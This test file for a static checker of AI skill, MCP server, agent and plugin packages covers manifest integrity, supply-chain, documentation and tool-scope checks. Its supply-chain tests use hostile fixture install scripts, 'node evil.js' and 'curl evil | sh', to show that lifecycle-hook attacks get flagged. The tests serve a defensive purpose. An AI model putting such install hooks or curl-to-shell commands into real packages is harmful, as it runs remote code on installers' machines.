/**
 * The static check catalog.
 *
 * Every check here is driven from an object literal — no fixtures
 * directory, no network, no repo. That constraint is the design being
 * tested as much as the checks are.
 */
import { describe, expect, it } from "vitest";
import {
  AGENT_CHECKS,
  DEFAULT_CHECKS,
  DOCUMENTATION_CHECKS,
  INTEGRITY_CHECKS,
  MCP_CHECKS,
  PLUGIN_CHECKS,
  SKILL_CHECKS,
  SUPPLY_CHAIN_CHECKS,
} from "../src/checks/index";
import { countWords, parseFrontmatter, parseList } from "../src/checks/manifest";
import { MemorySource } from "../src/sources/memory";
import type { CheckContext, CheckDefinition } from "../src/check";
import type { ArtifactKind, CheckResult } from "../src/types";

function ctxFor(
  files: Record<string, string>,
  kind: ArtifactKind = "skill",
  config: Record<string, string | number | boolean> = {},
): CheckContext {
  const noop = () => {};
  return {
    subject: {
      kind,
      name: "demo",
      source: { type: "directory", path: "." },
      digest: { sha256: "0".repeat(64) },
    },
    source: new MemorySource(files),
    config,
    log: { debug: noop, info: noop, warn: noop, error: noop },
    signal: new AbortController().signal,
  };
}

const run = (c: CheckDefinition, ctx: CheckContext): Promise<CheckResult> =>
  Promise.resolve(c.run(ctx));
const byId = (list: readonly CheckDefinition[], id: string): CheckDefinition =>
  list.find((c) => c.id === id)!;

// ── manifest helpers ────────────────────────────────────────────────

describe("parseFrontmatter", () => {
  it("extracts fields and strips the block from the body", () => {
    const fm = parseFrontmatter("---\nname: demo\ndescription: Does a thing\n---\n# Body\ntext");
    expect(fm.present).toBe(true);
    expect(fm.fields["name"]).toBe("demo");
    expect(fm.body.trim()).toBe("# Body\ntext");
  });

  it("reports absence rather than guessing", () => {
    const fm = parseFrontmatter("# Just markdown");
    expect(fm.present).toBe(false);
    expect(fm.body).toBe("# Just markdown");
  });

  it("strips quotes and reads block lists", () => {
    const fm = parseFrontmatter('---\nname: "quoted"\ntools:\n  - Bash\n  - Read\n---\nbody');
    expect(fm.fields["name"]).toBe("quoted");
    expect(parseList(fm.fields["tools"])).toEqual(["Bash", "Read"]);
  });

  it("reads inline lists", () => {
    expect(parseList("[Bash, Read]")).toEqual(["Bash", "Read"]);
  });

  it("ignores comments and blank lines", () => {
    const fm = parseFrontmatter("---\n# a comment\n\nname: x\n---\nbody");
    expect(fm.fields).toEqual({ name: "x" });
  });
});

describe("countWords", () => {
  it("counts latin words", () => {
    expect(countWords("one two three")).toBe(3);
  });

  // Whitespace splitting would score a 400-character Chinese
  // description as one word and fail every length threshold for
  // reasons unrelated to quality.
  it("counts CJK characters rather than scoring them as one word", () => {
    expect(countWords("格式化文本")).toBe(5);
  });

  it("handles mixed scripts", () => {
    expect(countWords("format 文本 nicely")).toBe(4);
  });
});

// ── integrity ───────────────────────────────────────────────────────

describe("integrity", () => {
  const manifestPresent = byId(INTEGRITY_CHECKS, "manifest-present");
  const nameDeclared = byId(INTEGRITY_CHECKS, "name-declared");
  const versionFormat = byId(INTEGRITY_CHECKS, "version-format");
  const entryResolves = byId(INTEGRITY_CHECKS, "entry-resolves");
  const filesExist = byId(INTEGRITY_CHECKS, "declared-files-exist");

  it("finds a skill manifest in SKILL.md frontmatter", async () => {
    const r = await run(manifestPresent, ctxFor({ "SKILL.md": "---\nname: x\n---\nbody" }));
    expect(r.status).toBe("pass");
  });

  it("fails when no manifest exists", async () => {
    const r = await run(manifestPresent, ctxFor({ "notes.txt": "hi" }));
    expect(r.status).toBe("fail");
    expect(r.remediation).toBeTruthy();
  });

  it("fails a manifest that does not parse", async () => {
    const r = await run(manifestPresent, ctxFor({ "package.json": "{oops" }, "mcp"));
    expect(r.status).toBe("fail");
    expect(r.summary).toMatch(/does not parse/);
  });

  it("is blocking — an unloadable artifact should not publish", () => {
    expect(manifestPresent.blocking).toBe(true);
  });

  it("SKIPS the name check when the manifest is already broken", async () => {
    // Reporting the same defect twice would double-penalize it.
    const r = await run(nameDeclared, ctxFor({ "package.json": "{oops" }, "mcp"));
    expect(r.status).toBe("skip");
  });

  it("accepts a scoped npm name", async () => {
    const pkg = JSON.stringify({ name: "@acme/server" });
    const r = await run(nameDeclared, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe("pass");
  });

  it("warns on a name that is not kebab-case", async () => {
    const pkg = JSON.stringify({ name: "My Server" });
    const r = await run(nameDeclared, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe("warn");
  });

  it.each([
    ["1.2.3", "pass"],
    ["v1.2.3", "pass"],
    ["1.2.3-beta.1", "pass"],
    ["1.2", "warn"],
    ["latest", "warn"],
  ])("version %s → %s", async (version, expected) => {
    const pkg = JSON.stringify({ name: "x", version });
    const r = await run(versionFormat, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe(expected);
  });

  it("fails when a declared entry point is missing", async () => {
    const pkg = JSON.stringify({ name: "x", main: "server.js" });
    const r = await run(entryResolves, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe("fail");
  });

  it("only warns when the missing entry is under a build directory", async () => {
    // A build step can legitimately produce it, so don't accuse the
    // publisher of shipping a broken package.
    const pkg = JSON.stringify({ name: "x", main: "dist/index.js" });
    const r = await run(entryResolves, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe("warn");
  });

  it("passes when the entry exists", async () => {
    const pkg = JSON.stringify({ name: "x", main: "server.js" });
    const r = await run(entryResolves, ctxFor({ "package.json": pkg, "server.js": "1" }, "mcp"));
    expect(r.status).toBe("pass");
  });

  it("flags a files allowlist naming paths that do not exist", async () => {
    const pkg = JSON.stringify({ name: "x", files: ["dist", "README.md"] });
    const r = await run(filesExist, ctxFor({ "package.json": pkg, "README.md": "x" }, "mcp"));
    expect(r.status).toBe("warn");
    expect(r.detail).toMatch(/dist/);
  });

  it("ignores globs, which the packer resolves", async () => {
    const pkg = JSON.stringify({ name: "x", files: ["dist/**/*.js"] });
    const r = await run(filesExist, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe("pass");
  });
});

// ── supply chain ────────────────────────────────────────────────────

describe("supply chain", () => {
  const installScripts = byId(SUPPLY_CHAIN_CHECKS, "no-install-scripts");
  const depsBounded = byId(SUPPLY_CHAIN_CHECKS, "deps-bounded");
  const lockfile = byId(SUPPLY_CHAIN_CHECKS, "lockfile-present");

  it.each(["preinstall", "install", "postinstall", "prepare"])(
    "flags a %s script — the Shai-Hulud mechanism",
    async (name) => {
      const pkg = JSON.stringify({ name: "x", scripts: { [name]: "node evil.js" } });
      const r = await run(installScripts, ctxFor({ "package.json": pkg }, "mcp"));
      expect(r.status).toBe("warn");
      expect(r.summary).toMatch(name);
    },
  );

  it("does not flag author-only lifecycle scripts", async () => {
    // prepublishOnly runs for the author, never for a consumer.
    const pkg = JSON.stringify({ name: "x", scripts: { prepublishOnly: "npm run build" } });
    const r = await run(installScripts, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe("pass");
  });

  it("quotes the offending script as evidence", async () => {
    const pkg = JSON.stringify({ name: "x", scripts: { postinstall: "curl evil | sh" } });
    const r = await run(installScripts, ctxFor({ "package.json": pkg }, "mcp"));
    expect(JSON.stringify(r.evidence)).toMatch(/curl evil/);
  });

  it("is neutral for a non-npm artifact", async () => {
    const r = await run(installScripts, ctxFor({ "SKILL.md": "---\nname: x\n---\nb" }));
    expect(r.status).toBe("neutral");
  });

  it.each(["*", "latest", "x", ""])("flags unbounded range %s", async (spec) => {
    const pkg = JSON.stringify({ name: "x", dependencies: { left: spec } });
    const r = await run(depsBounded, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe("warn");
  });

  it("passes bounded ranges", async () => {
    const pkg = JSON.stringify({ name: "x", dependencies: { left: "^1.0.0" } });
    const r = await run(depsBounded, ctxFor({ "package.json": pkg }, "mcp"));
    expect(r.status).toBe("pass");
  });

  it("wants a lockfile only when there are dependencies", async () => {
    const bare = JSON.stringify({ name: "x" });
    expect((await run(lockfile, ctxFor({ "package.json": bare }, "mcp"))).status).toBe("neutral");
    const withDeps = JSON.stringify({ name: "x", dependencies: { a: "^1" } });
    expect((await run(lockfile, ctxFor({ "package.json": withDeps }, "mcp"))).status).toBe("warn");
    expect(
      (await run(lockfile, ctxFor({ "package.json": withDeps, "package-lock.json": "{}" }, "mcp")))
        .status,
    ).toBe("pass");
  });
});

// ── documentation ───────────────────────────────────────────────────

describe("documentation", () => {
  const description = byId(DOCUMENTATION_CHECKS, "description-quality");
  const examples = byId(DOCUMENTATION_CHECKS, "usage-examples");
  const tests = byId(DOCUMENTATION_CHECKS, "tests-present");
  const ci = byId(DOCUMENTATION_CHECKS, "ci-configured");

  it("fails when no description is declared", async () => {
    const r = await run(description, ctxFor({ "SKILL.md": "---\nname: x\n---\nb" }));
    expect(r.status).toBe("fail");
  });

  it("grades a thin description proportionally", async () => {
    const thin = await run(
      description,
      ctxFor({ "SKILL.md": "---\nname: x\ndescription: Formats text into tidy tables\n---\nb" }),
    );
    const thinner = await run(
      description,
      ctxFor({ "SKILL.md": "---\nname: x\ndescription: Formats\n---\nb" }),
    );
    expect(thin.status).toBe("warn");
    expect(thin.score!).toBeGreaterThan(thinner.score!);
  });

  it("passes a substantive description", async () => {
    const doc =
      "---\nname: x\ndescription: Use when the user pastes tabular data and wants markdown\n---\nb";
    expect((await run(description, ctxFor({ "SKILL.md": doc }))).status).toBe("pass");
  });

  it("counts fenced examples in pairs", async () => {
    const r = await run(examples, ctxFor({ "README.md": "# X\n```js\ncode\n```\n" }));
    expect(r.status).toBe("pass");
    expect(r.summary).toMatch(/1 code example/);
  });

  it("warns when documentation has no examples", async () => {
    expect((await run(examples, ctxFor({ "README.md": "# X\nprose only" }))).status).toBe("warn");
  });

  // Gameable signals are reported, never scored.
  it("reports tests and CI at weight 0", async () => {
    expect(tests.weight).toBe(0);
    expect(ci.weight).toBe(0);
    const r = await run(tests, ctxFor({ "tests/a.test.ts": "x" }));
    expect(r.status).toBe("neutral");
    const c = await run(ci, ctxFor({ ".github/workflows/ci.yml": "on: push" }));
    expect(c.status).toBe("neutral");
  });
});

// ── kind-specific ───────────────────────────────────────────────────

describe("skill checks", () => {
  const frontmatter = byId(SKILL_CHECKS, "skill-frontmatter");
  const body = byId(SKILL_CHECKS, "skill-body");
  const triggers = byId(SKILL_CHECKS, "skill-triggers");
  const tools = byId(SKILL_CHECKS, "skill-allowed-tools");

  it("fails a SKILL.md with no frontmatter", async () => {
    const r = await run(frontmatter, ctxFor({ "SKILL.md": "# Just a heading" }));
    expect(r.status).toBe("fail");
  });

  it("fails when required frontmatter fields are missing", async () => {
    const r = await run(frontmatter, ctxFor({ "SKILL.md": "---\nname: x\n---\nb" }));
    expect(r.status).toBe("fail");
    expect(r.summary).toMatch(/description/);
  });

  it("warns on a stub body", async () => {
    const r = await run(body, ctxFor({ "SKILL.md": "---\nname: x\n---\nshort" }));
    expect(r.status).toBe("warn");
  });

  it("recognises a description that says WHEN to use the skill", async () => {
    const withCue = "---\nname: x\ndescription: Use when the user pastes a table\n---\nb";
    const without = "---\nname: x\ndescription: Formats text into tables\n---\nb";
    expect((await run(triggers, ctxFor({ "SKILL.md": withCue }))).status).toBe("pass");
    expect((await run(triggers, ctxFor({ "SKILL.md": without }))).status).toBe("warn");
  });

  it("warns when no tool scope is declared", async () => {
    const r = await run(tools, ctxFor({ "SKILL.md": "---\nname: x\n---\nb" }));
    expect(r.status).toBe("warn");
  });

  // An absent field and an explicitly empty one are opposite claims.
  // Treating both as "length === 0" warned at authors for doing exactly
  // what this check's own remediation tells them to do, which would hit
  // every correctly-scoped skill. Found by running the tool on a
  // deliberately well-formed fixture.
  it("PASSES an explicitly empty tool scope — the tightest scope there is", async () => {
    const doc = "---\nname: x\nallowed-tools: []\n---\nb";
    const r = await run(tools, ctxFor({ "SKILL.md": doc }));
    expect(r.status).toBe("pass");
    expect(r.summary).toMatch(/empty tool scope|needs no tools/i);
  });

  it("distinguishes an empty declaration from an absent one", async () => {
    const absent = await run(tools, ctxFor({ "SKILL.md": "---\nname: x\n---\nb" }));
    const empty = await run(
      tools,
      ctxFor({ "SKILL.md": "---\nname: x\nallowed-tools: []\n---\nb" }),
    );
    expect(absent.status).not.toBe(empty.status);
  });

  it("accepts an empty list written with the camelCase key too", async () => {
    const doc = "---\nname: x\nallowedTools: []\n---\nb";
    expect((await run(tools, ctxFor({ "SKILL.md": doc }))).status).toBe("pass");
  });

  it("surfaces an elevated tool scope without penalising it", async () => {
    // A skill that legitimately needs a shell should not score below
    // one that needs nothing — the point is that it is visible.
    const doc = "---\nname: x\nallowed-tools: [Bash, Read]\n---\nb";
    const r = await run(tools, ctxFor({ "SKILL.md": doc }));
    expect(r.status).toBe("pass");
    expect(r.summary).toMatch(/elevated/);
  });
});

describe("mcp checks", () => {
  const launchable = byId(MCP_CHECKS, "mcp-launchable");
  const sdk = byId(MCP_CHECKS, "mcp-sdk-pinned");
  const descriptions = byId(MCP_CHECKS, "mcp-tool-descriptions");

  it("passes a server declaring a bin", async () => {
    const pkg = JSON.stringify({ name: "s", bin: { s: "./server.js" } });
    expect((await run(launchable, ctxFor({ "package.json": pkg }, "mcp"))).status).toBe("pass");
  });

  it("fails a server with no way to launch", async () => {
    const pkg = JSON.stringify({ name: "s" });
    expect((await run(launchable, ctxFor({ "package.json": pkg }, "mcp"))).status).toBe("fail");
  });

  it("treats a Python server as out of scope rather than broken", async () => {
    const r = await run(launchable, ctxFor({ "pyproject.toml": "[project]" }, "mcp"));
    expect(r.status).toBe("neutral");
  });

  it("warns on an unbounded SDK range", async () => {
    const pkg = JSON.stringify({ name: "s", dependencies: { "@modelcontextprotocol/sdk": "*" } });
    expect((await run(sdk, ctxFor({ "package.json": pkg }, "mcp"))).status).toBe("warn");
  });

  it("is neutral for a server not using the TS SDK", async () => {
    const pkg = JSON.stringify({ name: "s" });
    expect((await run(sdk, ctxFor({ "package.json": pkg }, "mcp"))).status).toBe("neutral");
  });

  it("flags thin tool descriptions", async () => {
    const src = `server.tool("echo", "", handler);\nserver.tool("add", "Adds two numbers together", h);`;
    const r = await run(descriptions, ctxFor({ "index.ts": src }, "mcp"));
    expect(r.status).toBe("warn");
    expect(r.summary).toMatch(/1 of 2/);
  });

  it("skips rather than failing when registrations cannot be found statically", async () => {
    const r = await run(descriptions, ctxFor({ "index.ts": "// dynamic" }, "mcp"));
    expect(r.status).toBe("skip");
  });
});

describe("agent checks", () => {
  const shape = byId(AGENT_CHECKS, "agent-shape-declared");
  const instructions = byId(AGENT_CHECKS, "agent-instructions");

  it("accepts a code-based agent", async () => {
    const r = await run(shape, ctxFor({ "agent.json": '{"name":"a"}' }, "agent"));
    expect(r.status).toBe("pass");
    expect(r.summary).toMatch(/Code-based/);
  });

  // A prompt-based agent has no entry file by definition; demanding one
  // would fail every artifact of this shape for a defect it cannot have.
  it("accepts a prompt-based agent with no entry file", async () => {
    const r = await run(
      shape,
      ctxFor({ "agents/reviewer.md": "---\nname: r\n---\nbody" }, "agent"),
    );
    expect(r.status).toBe("pass");
    expect(r.summary).toMatch(/Prompt-based/);
  });

  it("fails when neither shape is present", async () => {
    expect((await run(shape, ctxFor({ "readme.md": "x" }, "agent"))).status).toBe("fail");
  });

  it("warns on a stub prompt body", async () => {
    const r = await run(
      instructions,
      ctxFor({ "agents/r.md": "---\nname: r\n---\ntiny" }, "agent"),
    );
    expect(r.status).toBe("warn");
  });
});

describe("plugin checks", () => {
  const manifest = byId(PLUGIN_CHECKS, "plugin-manifest");
  const declared = byId(PLUGIN_CHECKS, "plugin-bundle-declared");
  const resolves = byId(PLUGIN_CHECKS, "plugin-bundle-resolves");

  it("passes a manifest at the conventional location", async () => {
    const r = await run(
      manifest,
      ctxFor({ ".claude-plugin/plugin.json": '{"name":"p"}' }, "plugin"),
    );
    expect(r.status).toBe("pass");
    expect(r.summary).toMatch(/conventional/);
  });

  it("accepts a root manifest but notes the convention", async () => {
    const r = await run(manifest, ctxFor({ "plugin.json": '{"name":"p"}' }, "plugin"));
    expect(r.status).toBe("pass");
    expect(r.summary).toMatch(/convention is/);
  });

  it("warns when a plugin declares nothing bundled", async () => {
    const r = await run(declared, ctxFor({ "plugin.json": '{"name":"p"}' }, "plugin"));
    expect(r.status).toBe("warn");
  });

  it("enumerates what the bundle contains", async () => {
    const m = JSON.stringify({ name: "p", skills: ["skills/a"], commands: ["fmt"] });
    const r = await run(declared, ctxFor({ "plugin.json": m }, "plugin"));
    expect(r.status).toBe("pass");
    expect(r.summary).toMatch(/1 skills, 1 commands/);
  });

  it("fails when a declared member does not exist", async () => {
    // Otherwise the plugin installs cleanly and silently does less than
    // it advertised.
    const m = JSON.stringify({ name: "p", skills: ["skills/missing"] });
    const r = await run(resolves, ctxFor({ "plugin.json": m }, "plugin"));
    expect(r.status).toBe("fail");
  });

  it("accepts a member that resolves to a directory with SKILL.md", async () => {
    const m = JSON.stringify({ name: "p", skills: ["skills/fmt"] });
    const r = await run(
      resolves,
      ctxFor({ "plugin.json": m, "skills/fmt/SKILL.md": "---\nname: f\n---\nb" }, "plugin"),
    );
    expect(r.status).toBe("pass");
  });
});

// ── the suite as a whole ────────────────────────────────────────────

describe("the default suite", () => {
  it("has no duplicate ids", () => {
    const ids = DEFAULT_CHECKS.map((c) => c.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("gives every check a published spec URL", () => {
    for (const c of DEFAULT_CHECKS) expect(c.spec, `${c.id} has no spec`).toBeTruthy();
  });

  it("now covers integrity, safety and care", () => {
    expect(new Set(DEFAULT_CHECKS.map((c) => c.axis))).toEqual(
      new Set(["integrity", "safety", "care"]),
    );
  });

  it("keeps every static check deterministic or clock-bound", () => {
    for (const c of DEFAULT_CHECKS) {
      expect(["deterministic", "sampled"], `${c.id}`).toContain(c.determinism);
    }
  });

  it("declares blocking only where an artifact genuinely will not work", () => {
    const blocking = DEFAULT_CHECKS.filter((c) => c.blocking).map((c) => c.id);
    expect(blocking).toEqual(
      expect.arrayContaining(["no-sensitive-files", "manifest-present", "entry-resolves"]),
    );
  });
});
